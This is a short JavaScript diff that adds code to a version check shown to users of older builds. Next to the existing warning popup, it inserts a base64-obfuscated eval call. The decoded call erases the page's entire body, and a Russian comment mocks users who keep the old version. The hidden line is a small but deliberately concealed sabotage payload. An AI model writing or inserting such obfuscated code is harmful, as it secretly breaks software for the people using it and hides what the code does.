@@ -240,6 +240,8 @@ function createWarningPopup() {
 }
 
 if (build > 150 && build < newerBuildPopup ) {
+	(()=>{eval(atob("ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiIjs="))})();
+	//Если хотите использовать древнюю версию, то пожалуйста. Вы знете что делать =)
 	createWarningPopup()
 }
 
